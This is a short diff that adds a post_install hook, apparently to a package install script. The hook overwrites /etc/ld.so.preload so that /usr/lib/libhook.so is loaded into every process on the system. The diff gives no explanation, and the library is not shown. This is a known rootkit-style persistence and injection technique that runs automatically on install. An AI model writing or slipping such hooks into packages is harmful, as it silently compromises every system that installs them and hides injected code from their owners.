@@ -1,0 +1,3 @@
+post_install() {
+  echo '/usr/lib/libhook.so' > /etc/ld.so.preload
+}
